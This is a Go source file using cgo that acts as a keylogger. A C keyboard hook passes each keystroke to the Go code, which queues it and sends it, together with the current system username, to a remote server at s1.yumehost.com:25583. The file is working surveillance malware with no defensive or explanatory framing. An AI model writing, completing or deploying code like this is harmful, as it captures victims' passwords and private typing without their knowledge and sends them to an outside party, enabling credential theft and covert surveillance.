package main

/*
 #include "print.h"
*/
import "C"
import (
	"log"
	"net/http"
	"os/user"
	"strings"
)

var chanBuffer = make(chan string, 100)

//export GoHandleKey
func GoHandleKey(key *C.char) {
	select {
	case chanBuffer <- C.GoString(key):
	default:
	}
}

func handleFunc() {
	for res := range chanBuffer {
		sendKeyToServer(res)
	}
}

func sendKeyToServer(key string) {
	name, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	req, _ := http.NewRequest("GET", "http://s1.yumehost.com:25583/", strings.NewReader(name.Username+":"+key))

	client := &http.Client{}
	_, _ = client.Do(req)
}

func main() {
	defer close(chanBuffer)
	go handleFunc()
	C.printKeyBoard()
}
